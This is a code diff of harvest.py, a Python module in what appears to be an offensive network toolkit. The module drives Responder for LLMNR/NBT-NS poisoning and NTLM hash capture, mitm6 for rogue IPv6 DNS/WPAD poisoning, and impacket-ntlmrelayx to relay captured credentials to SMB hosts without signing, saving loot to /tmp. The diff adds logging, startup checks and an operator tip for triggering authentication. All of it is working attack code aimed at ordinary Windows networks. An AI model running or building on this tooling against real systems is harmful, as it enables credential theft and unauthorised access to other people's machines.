@@ -2,8 +2,8 @@
 harvest.py — Passive NTLM/NTLMv2 hash capture via Responder + optional relay
 """
 
-import subprocess, threading, time, re, os, shutil
-from . import tui
+import subprocess, threading, time, re, os, shutil, socket
+from . import tui, logger
 
 RESPONDER_PATH = "/usr/share/responder/Responder.py"
 NTLM_RE        = re.compile(
@@ -13,33 +13,70 @@ NTLM_RE        = re.compile(
 _proc        = None
 _relay_proc  = None
 _hashes      = []
-_relay_hits  = []   # { ip, user, shell_available }
+_relay_hits  = []
 _lock        = threading.Lock()
+
+
+# ── port check ────────────────────────────────────────────────────────────────
+
+def _port_bound(port: int) -> bool:
+    """Check if something is listening on a local port."""
+    try:
+        s = socket.create_connection(("127.0.0.1", port), timeout=1)
+        s.close()
+        return True
+    except Exception:
+        return False
 
 
 # ── Responder passive capture ─────────────────────────────────────────────────
 
 def start(iface: str):
-    """Launch Responder in background (poisoning only, no SMB/HTTP servers
-    so relay can use those ports). Returns live-updating hashes list."""
     global _proc, _hashes
     _hashes = []
 
     if not os.path.exists(RESPONDER_PATH):
-        tui.error("Responder not found — install: sudo apt install responder")
+        tui.error(
+            f"Responder not found at {RESPONDER_PATH}\n"
+            f"  Install: sudo apt install responder"
+        )
+        logger.error(f"Responder not found: {RESPONDER_PATH}")
         return _hashes
 
     cmd = ["python3", RESPONDER_PATH, "-I", iface, "-v"]
     tui.info(f"Starting Responder on {iface} ...")
-    _proc = subprocess.Popen(
-        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
-    )
+    logger.info(f"Starting Responder: {' '.join(cmd)}")
+
+    try:
+        _proc = subprocess.Popen(
+            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
+        )
+    except Exception as e:
+        tui.error(f"Failed to start Responder: {e}")
+        logger.error(f"Responder Popen failed: {e}")
+        return _hashes
+
     threading.Thread(target=_reader, daemon=True).start()
+
+    # Give Responder 2s to start, then verify it's still alive
+    time.sleep(2)
+    if _proc.poll() is not None:
+        tui.error(
+            f"Responder exited immediately (rc={_proc.returncode}).\n"
+            f"  Common causes: already running, port 445 in use, not run as root.\n"
+            f"  Check log for details: {logger.path()}"
+        )
+        logger.error(f"Responder died on startup rc={_proc.returncode}")
+        _proc = None
+
     return _hashes
 
 
 def _reader():
     for line in _proc.stdout:
+        line = line.rstrip()
+        if line:
+            logger.info(f"[Responder] {line}")
         m = NTLM_RE.search(line)
         if m:
             user   = m.group(1)
@@ -49,6 +86,7 @@ def _reader():
                 if hash_ not in _hashes:
                     _hashes.append(hash_)
                     tui.success(f"Hash captured: {tui.YLW}{user}@{domain}{tui.R}")
+                    logger.success(f"Hash captured: {user}@{domain}")
 
 
 def stop():
@@ -57,6 +95,7 @@ def stop():
         _proc.terminate()
         _proc = None
         tui.info("Responder stopped.")
+        logger.info("Responder stopped")
 
 
 def captured() -> list[str]:
@@ -65,11 +104,30 @@ def captured() -> list[str]:
 
 
 def wait_and_capture(iface: str, timeout: int = 120) -> list[str]:
-    """Block for `timeout` seconds while Responder runs, then stop and return hashes."""
     start(iface)
+
+    if _proc is None:
+        tui.warn("Responder did not start — cannot harvest hashes.")
+        return []
+
+    tui.info(
+        f"Waiting {timeout}s for LLMNR/NBT-NS hash captures ...\n"
+        f"  Tip: on Windows targets, browse to a non-existent network path\n"
+        f"       e.g. type \\\\fakeshare1234 in Explorer to trigger auth."
+    )
+
     deadline = time.time() + timeout
     bar_w    = 40
     while time.time() < deadline:
+        # Check process still alive every iteration
+        if _proc and _proc.poll() is not None:
+            tui.warn(
+                f"Responder died during capture (rc={_proc.returncode}).\n"
+                f"  Check log for Responder output: {logger.path()}"
+            )
+            logger.warn(f"Responder died mid-capture rc={_proc.returncode}")
+            break
+
         elapsed = timeout - (deadline - time.time())
         filled  = int(bar_w * elapsed / timeout)
         bar     = f"{'█' * filled}{'░' * (bar_w - filled)}"
@@ -85,32 +143,41 @@ def wait_and_capture(iface: str, timeout: int = 120) -> list[str]:
     return captured()
 
 
-# ── NTLM relay attack ─────────────────────────────────────────────────────────
+# ── NTLM relay ────────────────────────────────────────────────────────────────
 
 _mitm6_proc = None
 
 
 def start_mitm6(iface_name: str):
-    """
-    Launch mitm6 — sends rogue DHCPv6 responses so Windows machines use our
-    Pi as their IPv6 DNS server.  This causes them to query for WPAD over
-    HTTP, which ntlmrelayx intercepts and uses to harvest NTLM credentials
-    without any user interaction.
-
-    mitm6 install: pip3 install mitm6 --break-system-packages
-    """
     global _mitm6_proc
     exe = shutil.which("mitm6") or os.path.expanduser("~/.local/bin/mitm6")
     if not os.path.exists(exe or ""):
-        tui.warn("mitm6 not found — IPv6 DNS poisoning disabled.")
-        tui.info("Install: pip3 install mitm6 --break-system-packages")
+        tui.warn(
+            "mitm6 not found — IPv6 DNS poisoning disabled.\n"
+            "  Install: sudo pip3 install mitm6 --break-system-packages\n"
+            "  Note: mitm6 only works if the target network has IPv6 enabled."
+        )
+        logger.warn("mitm6 not found")
         return
 
     cmd = [exe, "-i", iface_name, "-d", "local", "--ignore-nofqdn"]
-    tui.info(f"Starting mitm6 on {iface_name} (IPv6 DNS poisoning) ...")
-    _mitm6_proc = subprocess.Popen(
-        cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-    )
+    tui.info(f"Starting mitm6 on {iface_name} ...")
+    logger.info(f"Starting mitm6: {' '.join(cmd)}")
+    try:
+        _mitm6_proc = subprocess.Popen(
+            cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+        time.sleep(1)
+        if _mitm6_proc.poll() is not None:
+            tui.warn(
+                f"mitm6 exited immediately — likely no IPv6 on this network.\n"
+                f"  Relay will continue without IPv6 DNS poisoning."
+            )
+            logger.warn("mitm6 exited immediately (no IPv6?)")
+            _mitm6_proc = None
+    except Exception as e:
+        tui.warn(f"mitm6 failed to start: {e}")
+        logger.error(f"mitm6 exception: {e}")
 
 
 def stop_mitm6():
@@ -122,48 +189,65 @@ def stop_mitm6():
 
 def start_relay(targets: list[str], iface_name: str, timeout: int = 120,
                 use_mitm6: bool = True) -> list[dict]:
-    """
-    Run impacket-ntlmrelayx against targets that have SMB signing disabled.
-    Relays captured authentications in real-time — no need to crack hashes.
-
-    If use_mitm6=True (default), also launches mitm6 to force Windows machines
-    on the subnet to authenticate via IPv6 WPAD — no waiting for organic traffic.
-
-    Returns list of { ip, user } for successful relays.
-
-    Requires: impacket-ntlmrelayx, Responder with SMB/HTTP disabled.
-    """
     global _relay_proc, _relay_hits
     _relay_hits = []
 
     exe = shutil.which("impacket-ntlmrelayx") or shutil.which("ntlmrelayx.py")
     if not exe:
-        tui.error("impacket-ntlmrelayx not found — install: sudo apt install python3-impacket")
+        tui.error(
+            "impacket-ntlmrelayx not found.\n"
+            "  Install: sudo apt install python3-impacket"
+        )
+        logger.error("ntlmrelayx not found")
         return _relay_hits
 
-    # Build target list file
     target_file = "/tmp/cascade_relay_targets.txt"
     with open(target_file, "w") as f:
         for t in targets:
             f.write(f"smb://{t}\n")
 
     tui.info(f"Starting NTLM relay → {len(targets)} target(s) ...")
-
-    # -wh wpad.local makes ntlmrelayx serve a fake WPAD file over HTTP,
-    # which mitm6 causes Windows to request automatically.
     cmd = [exe, "-tf", target_file, "-smb2support",
            "-wh", "wpad.local",
            "-l", "/tmp/cascade_relay_loot",
            "-of", "/tmp/cascade_relay_hashes"]
-    _relay_proc = subprocess.Popen(
-        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
-    )
+    logger.info(f"Starting ntlmrelayx: {' '.join(cmd)}")
+
+    try:
+        _relay_proc = subprocess.Popen(
+            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
+        )
+    except Exception as e:
+        tui.error(f"Failed to start ntlmrelayx: {e}")
+        logger.error(f"ntlmrelayx Popen failed: {e}")
+        return _relay_hits
+
     threading.Thread(target=_relay_reader, daemon=True).start()
 
-    # Responder in relay mode (SMB/HTTP off so ntlmrelayx can own those ports)
-    _start_responder_relay_mode(iface_name)
+    # Verify ntlmrelayx actually bound port 445
+    time.sleep(2)
+    if _relay_proc.poll() is not None:
+        tui.error(
+            f"ntlmrelayx exited immediately (rc={_relay_proc.returncode}).\n"
+            f"  Port 445 may already be in use (check: sudo ss -tlnp | grep 445).\n"
+            f"  Check log for details: {logger.path()}"
+        )
+        logger.error(f"ntlmrelayx died rc={_relay_proc.returncode}")
+        _relay_proc = None
+        return _relay_hits
 
-    # mitm6 for active IPv6 DNS poisoning — forces auth without user interaction
+    if not _port_bound(445):
+        tui.warn(
+            "ntlmrelayx started but port 445 does not appear bound.\n"
+            "  This is a known impacket issue on some Linux kernels.\n"
+            "  Relay may not work — switch to passive Responder capture instead.\n"
+            f"  Check log for ntlmrelayx output: {logger.path()}"
+        )
+        logger.warn("ntlmrelayx running but port 445 not bound")
+    else:
+        tui.success("ntlmrelayx listening on port 445.")
+
+    _start_responder_relay_mode(iface_name)
     if use_mitm6:
         start_mitm6(iface_name)
 
@@ -182,25 +266,23 @@ def start_relay(targets: list[str], iface_name: str, timeout: int = 120,
         )
         time.sleep(1)
     print()
-
     stop_relay()
     return _relay_hits
 
 
 def _start_responder_relay_mode(iface: str):
-    """Start Responder with SMB and HTTP disabled (relay mode)."""
     global _proc
     conf = "/etc/responder/Responder.conf"
-    # Patch config to disable SMB/HTTP so ntlmrelayx can use port 445/80
     try:
         with open(conf) as f:
             content = f.read()
-        patched = re.sub(r"^(SMB\s*=\s*)On", r"\1Off", content, flags=re.M)
+        patched = re.sub(r"^(SMB\s*=\s*)On",  r"\1Off", content, flags=re.M)
         patched = re.sub(r"^(HTTP\s*=\s*)On", r"\1Off", patched, flags=re.M)
         with open(conf, "w") as f:
             f.write(patched)
-    except Exception:
-        pass
+        logger.info("Responder.conf: SMB/HTTP set to Off for relay mode")
+    except Exception as e:
+        logger.warn(f"Could not patch Responder.conf: {e}")
 
     if os.path.exists(RESPONDER_PATH):
         _proc = subprocess.Popen(
@@ -212,8 +294,11 @@ def _start_responder_relay_mode(iface: str):
 
 def _relay_reader():
     for line in _relay_proc.stdout:
-        # ntlmrelayx prints success lines like: [*] Authenticating against smb://x.x.x.x as DOMAIN/user SUCCEED
-        m = re.search(r"Authenticating against smb://([\d.]+) as [^/]+/(\S+)\s+SUCCEED", line)
+        line = line.rstrip()
+        logger.info(f"[ntlmrelayx] {line}")
+        m = re.search(
+            r"Authenticating against smb://([\d.]+) as [^/]+/(\S+)\s+SUCCEED", line
+        )
         if m:
             ip   = m.group(1)
             user = m.group(2)
@@ -222,6 +307,7 @@ def _relay_reader():
                 if entry not in _relay_hits:
                     _relay_hits.append(entry)
                     tui.success(f"RELAY HIT: {tui.YLW}{user}{tui.R} → {tui.WH}{ip}{tui.R}")
+                    logger.success(f"Relay hit: {user} → {ip}")
 
 
 def stop_relay():
@@ -236,22 +322,21 @@ def stop_relay():
     _relay_proc = None
     _proc       = None
 
-    # Restore Responder.conf SMB/HTTP back to On
     conf = "/etc/responder/Responder.conf"
     try:
         with open(conf) as f:
             content = f.read()
-        restored = re.sub(r"^(SMB\s*=\s*)Off", r"\1On", content, flags=re.M)
+        restored = re.sub(r"^(SMB\s*=\s*)Off",  r"\1On", content, flags=re.M)
         restored = re.sub(r"^(HTTP\s*=\s*)Off", r"\1On", restored, flags=re.M)
         with open(conf, "w") as f:
             f.write(restored)
+        logger.info("Responder.conf restored")
     except Exception:
         pass
     tui.info("Relay stopped. Responder.conf restored.")
 
 
 def relay_targets_from_hosts(hosts: list[dict]) -> list[str]:
-    """Return IPs of Windows SMB hosts with signing disabled (relay candidates)."""
     from . import lateral
     candidates = []
     for h in hosts:
